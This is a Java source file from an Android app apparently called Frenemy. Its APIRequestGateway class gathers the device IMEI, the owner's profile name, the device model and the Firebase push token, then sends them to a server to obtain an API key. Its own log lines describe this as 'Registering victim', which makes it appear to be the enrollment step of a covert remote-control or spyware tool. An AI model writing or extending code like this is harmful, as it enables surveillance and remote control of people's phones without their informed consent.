package com.theah64.frenemy.android.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.NonNull;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.crash.FirebaseCrash;
import com.google.firebase.iid.FirebaseInstanceId;
import com.theah64.frenemy.android.models.Frenemy;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway implements PermissionUtils.Callback {

    public static final String KEY_API_KEY = "api_key";
    private static final String X = APIRequestGateway.class.getSimpleName();
    private static final String KEY_ID = "id";
    private final Context context;
    @NonNull
    private final APIRequestGatewayCallback callback;

    public APIRequestGateway(Context context, @NonNull APIRequestGatewayCallback callback) {
        this.context = context;
        this.callback = callback;
        new PermissionUtils(context, this, null).begin();
    }

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }

    @Override
    public void onAllPermissionGranted() {
        execute();
    }

    @Override
    public void onPermissionDenial() {
        Log.e(X, "Permission not granted");
    }

    private void register(final Context context) throws IOException, JSONException {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = tm.getDeviceId();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);

        final PrefUtils prefUtils = PrefUtils.getInstance(context);

        String fcmId = FirebaseInstanceId.getInstance().getToken();

        if (fcmId == null) {
            Log.d(X, "Live token is null, collecting from pref");
            fcmId = prefUtils.getString(Frenemy.KEY_FCM_ID);
        }

        final String finalFcmId = fcmId;

        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/get_api_key")
                .addParamIfNotNull("name", name)
                .addParam("device_hash", deviceHash)
                .addParam("imei", imei)
                .addParamIfNotNull(Frenemy.KEY_FCM_ID, fcmId)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(@NonNull Call call, @NonNull final IOException e) {
                e.printStackTrace();
                callback.onFailed(e.getMessage());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull okhttp3.Response response) throws IOException {

                try {

                    final Response inResp = new Response(OkHttpUtils.logAndGetStringBody(response));
                    final JSONObject joData = inResp.getJSONObjectData();
                    final String apiKey = joData.getString(KEY_API_KEY);
                    final String id = joData.getString(KEY_ID);

                    //Saving in preference
                    final SharedPreferences.Editor editor = prefUtils.getEditor();
                    editor.putString(KEY_API_KEY, apiKey);
                    editor.putString(KEY_ID, id);
                    editor.putBoolean(Frenemy.KEY_IS_FCM_SYNCED, true);

                    editor.commit();

                    callback.onReadyToRequest(apiKey, id);

                } catch (JSONException | Response.ResponseException e) {
                    e.printStackTrace();
                    callback.onFailed(e.getMessage());
                }
            }
        });
    }

    private void execute() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);
            final String id = prefUtils.getString(KEY_ID);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                callback.onReadyToRequest(apiKey, id);

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                try {
                    register(context);
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                    Log.e(X, "Failed to signup employee");
                    FirebaseCrash.report(e);
                }
            }

        } else {
            callback.onFailed("No network!");
            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }

    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey, final String frenemyId);

        void onFailed(final String reason);
    }
}
